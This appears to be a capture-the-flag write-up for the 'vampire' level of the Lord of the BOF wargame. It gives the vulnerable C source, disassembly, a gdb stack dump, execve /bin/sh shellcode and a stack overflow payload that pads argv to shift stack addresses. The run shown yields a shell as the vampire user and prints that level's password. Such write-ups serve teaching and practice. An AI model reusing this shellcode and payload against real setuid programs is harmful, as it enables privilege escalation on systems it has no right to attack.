# Level 8, Troll -> Vampire

### vampire.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - vampire
        - check 0xbfff
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
        char buffer[40];

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // here is changed!
        if(argv[1][46] == '\xff')
        {
                printf("but it's not forever\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}
```

### Analysis

#### Disassembling the "vampire"

```
0x8048430 <main>:       push   %ebp
0x8048431 <main+1>:     mov    %ebp,%esp
0x8048433 <main+3>:     sub    %esp,40
0x8048436 <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x804843a <main+10>:    jg     0x8048453 <main+35>
0x804843c <main+12>:    push   0x8048520
0x8048441 <main+17>:    call   0x8048350 <printf>
0x8048446 <main+22>:    add    %esp,4
0x8048449 <main+25>:    push   0
0x804844b <main+27>:    call   0x8048360 <exit>
0x8048450 <main+32>:    add    %esp,4
0x8048453 <main+35>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048456 <main+38>:    add    %eax,4
0x8048459 <main+41>:    mov    %edx,DWORD PTR [%eax]
0x804845b <main+43>:    add    %edx,47
0x804845e <main+46>:    cmp    BYTE PTR [%edx],0xbf
0x8048461 <main+49>:    je     0x8048480 <main+80>
0x8048463 <main+51>:    push   0x804852c
0x8048468 <main+56>:    call   0x8048350 <printf>
0x804846d <main+61>:    add    %esp,4
0x8048470 <main+64>:    push   0
0x8048472 <main+66>:    call   0x8048360 <exit>
0x8048477 <main+71>:    add    %esp,4
0x804847a <main+74>:    lea    %esi,[%esi]
0x8048480 <main+80>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048483 <main+83>:    add    %eax,4
0x8048486 <main+86>:    mov    %edx,DWORD PTR [%eax]
0x8048488 <main+88>:    add    %edx,46
0x804848b <main+91>:    cmp    BYTE PTR [%edx],0xff
0x804848e <main+94>:    jne    0x80484a7 <main+119>
0x8048490 <main+96>:    push   0x8048549
0x8048495 <main+101>:   call   0x8048350 <printf>
0x804849a <main+106>:   add    %esp,4
0x804849d <main+109>:   push   0
0x804849f <main+111>:   call   0x8048360 <exit>
0x80484a4 <main+116>:   add    %esp,4
0x80484a7 <main+119>:   mov    %eax,DWORD PTR [%ebp+12]
0x80484aa <main+122>:   add    %eax,4
0x80484ad <main+125>:   mov    %edx,DWORD PTR [%eax]
0x80484af <main+127>:   push   %edx
0x80484b0 <main+128>:   lea    %eax,[%ebp-40]
0x80484b3 <main+131>:   push   %eax
0x80484b4 <main+132>:   call   0x8048370 <strcpy>
0x80484b9 <main+137>:   add    %esp,8
0x80484bc <main+140>:   lea    %eax,[%ebp-40]
0x80484bf <main+143>:   push   %eax
0x80484c0 <main+144>:   push   0x804855f
0x80484c5 <main+149>:   call   0x8048350 <printf>
0x80484ca <main+154>:   add    %esp,8
0x80484cd <main+157>:   leave
0x80484ce <main+158>:   ret
```

#### Estimated Stack Structure

```
|  BUFFER (40 bytes) |
|  SFP (4 bytes)     |
|  RET (4 bytes)     |
|  ARGC (4 bytes)    |
|       ...          |
```

#### Observed Stack Structure (bp at *main+140)

```
(gdb) b *main+140
Breakpoint 2 at 0x80484bc
(gdb) run `python -c "print 'A'*44+'\xbf\xbf\xbf\xbf'"` `python -c "print '\x90'*2000+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/troll/vampire-cp `python -c "print 'A'*44+'\xbf\xbf\xbf\xbf'"` `python -c "print '\x90'*2000+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`

Breakpoint 2, 0x80484bc in main ()

(gdb) x/200x $esp
0xbffefab0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffefac0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffefad0:     0x41414141      0x41414141      0x41414141      0xbfbfbfbf
0xbffefae0:     0x00000000      0xbffefb24      0xbffefb34      0x40013868
0xbffefaf0:     0x00000003      0x08048380      0x00000000      0x080483a1
0xbffefb00:     0x08048430      0x00000003      0xbffefb24      0x080482e0
0xbffefb10:     0x080484fc      0x4000ae60      0xbffefb1c      0x40013e90
0xbffefb20:     0x00000003      0xbffefc1a      0xbffefc31      0xbffefc62
0xbffefb30:     0x00000000      0xbffffc7b      0xbffffc8b      0xbffffca4
0xbffefb40:     0xbffffcc3      0xbffffce5      0xbffffcf0      0xbffffeb3
0xbffefb50:     0xbffffed2      0xbffffeed      0xbfffff02      0xbfffff1f
0xbffefb60:     0xbfffff2a      0xbfffff38      0xbfffff40      0xbfffff51
0xbffefb70:     0xbfffff5b      0xbfffff69      0xbfffff7a      0xbfffff88
0xbffefb80:     0xbfffff93      0xbfffffa4      0x00000000      0x00000003
0xbffefb90:     0x08048034      0x00000004      0x00000020      0x00000005
0xbffefba0:     0x00000006      0x00000006      0x00001000      0x00000007
0xbffefbb0:     0x40000000      0x00000008      0x00000000      0x00000009
0xbffefbc0:     0x08048380      0x0000000b      0x000001fc      0x0000000c
0xbffefbd0:     0x000001fc      0x0000000d      0x000001fc      0x0000000e
0xbffefbe0:     0x000001fc      0x00000010      0x0fabfbff      0x0000000f
0xbffefbf0:     0xbffefc15      0x00000000      0x00000000      0x00000000
0xbffefc00:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffefc10:     0x00000000      0x38366900      0x682f0036      0x2f656d6f
0xbffefc20:     0x6c6f7274      0x61762f6c      0x7269706d      0x70632d65
0xbffefc30:     0x41414100      0x41414141      0x41414141      0x41414141
0xbffefc40:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffefc50:     0x41414141      0x41414141      0x41414141      0xbfbfbf41
0xbffefc60:     0x909000bf      0x90909090      0x90909090      0x90909090
0xbffefc70:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefc80:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefc90:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefca0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefcb0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefcc0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefcd0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefce0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefcf0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefd00:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefd10:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefd20:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefd30:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefd40:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefd50:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefd60:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefd70:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefd80:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefd90:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefda0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefdb0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffefdc0:     0x90909090      0x90909090      0x90909090      0x90909090
```

### Exploit

#### How to pwn

```
Exit process when (argv[1][46] == '\xff').
Put large ARGV when execute program, therefore changing stack's address a bit.
```

#### Shellcode (24 bytes)

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

#### Final Payload

```
./vampire `python -c "print 'A'*44+'\xe0\xfc\xfe\xbf'"` `python -c "print '\x90'*0x10000+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
```

### Result

```
[troll@localhost troll]$ ./vampire `python -c "print 'A'*44+'\xe0\xfc\xfe\xbf'"` `python -c "print '\x90'*0x10000+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒▒
bash$ id
uid=508(troll) gid=508(troll) euid=509(vampire) egid=509(vampire) groups=508(troll)
bash$ my-pass
euid = 509
music world
```